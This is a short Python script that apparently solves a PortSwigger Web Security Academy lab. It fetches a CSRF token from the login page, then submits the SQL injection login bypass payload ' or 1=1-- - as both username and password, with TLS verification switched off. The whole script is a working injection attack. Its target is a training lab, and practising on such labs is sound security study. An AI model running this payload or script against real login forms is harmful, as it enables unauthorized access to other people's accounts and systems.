import requests
import re
requests.packages.urllib3.disable_warnings()

global r
r = requests.Session()

# Edit the url here
url = "https://0a1200c3032bf8ab82b55bc900460010.web-security-academy.net/"
username = "' or 1=1-- -"
password = "' or 1=1-- -"

def get_csrf(endpoint = "/") -> str:
    s = r.get(url + endpoint, verify=False)
    csrf = re.findall(r'name="csrf" value="(.+?)"', s.text)[0]
    return csrf

def exploit():
    csrf = get_csrf("/login")
    data = {
        "csrf": csrf,
        "username": username,
        "password": password,
    }
    s = r.post(url + "/login", data=data, verify=False)
    if "Congratulations" in s.text:
        print("Lab solved!")

if __name__ == "__main__":
    exploit()